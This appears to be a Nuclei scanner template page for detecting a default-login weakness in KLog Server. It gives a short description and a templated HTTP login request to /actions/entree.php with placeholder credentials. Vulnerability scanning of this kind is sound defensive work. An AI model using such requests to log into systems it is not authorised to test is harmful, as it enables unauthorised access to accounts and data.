# Nuclei Template: KLog Server - Default Login
**Template ID:** klog-server-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`klog-server-default-login.yaml`)

## Vulnerability Information & PoC

## Description
KLog Server contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /actions/entree.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

user={{username}}&pswd={{password}}&action=login

GET /index.php HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.klogserver.com/
